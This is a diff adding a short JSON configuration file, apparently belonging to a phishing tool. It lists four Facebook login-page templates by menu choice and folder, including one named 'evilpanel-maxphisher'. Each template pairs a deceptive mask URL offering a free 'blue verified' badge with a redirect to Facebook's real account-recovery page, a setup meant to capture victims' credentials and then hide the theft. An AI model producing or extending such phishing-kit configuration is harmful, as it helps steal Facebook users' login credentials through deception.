@@ -1,0 +1,32 @@
+{
+    "Login": [
+      {
+        "name": "Facebook Primary",
+        "choice": "1",
+        "folder": "facebook_primary",
+        "mask": "https://blue-verified-facebook-free",
+        "redirect": "https://facebook.com/recover/initiate/"
+      },
+        {
+          "name": "Facebook Specific",
+          "choice": "2",
+          "folder": "facebook-specific",
+          "mask": "https://blue-verified-facebook-free",
+          "redirect": "https://facebook.com/recover/initiate/"
+          },
+          {
+            "name": "Facebook evilpanel-maxphisher",
+            "choice": "3",
+            "folder": "facebook_evilpanel-maxphisher",
+            "mask": "https://blue-verified-facebook-free",
+            "redirect": "https://facebook.com/recover/initiate/"
+            },
+            {
+              "name": "test",
+              "choice": "4",
+              "folder": "test",
+              "mask": "https://blue-verified-facebook-free",
+              "redirect": "m.facebook.com"
+              }
+    ]
+}
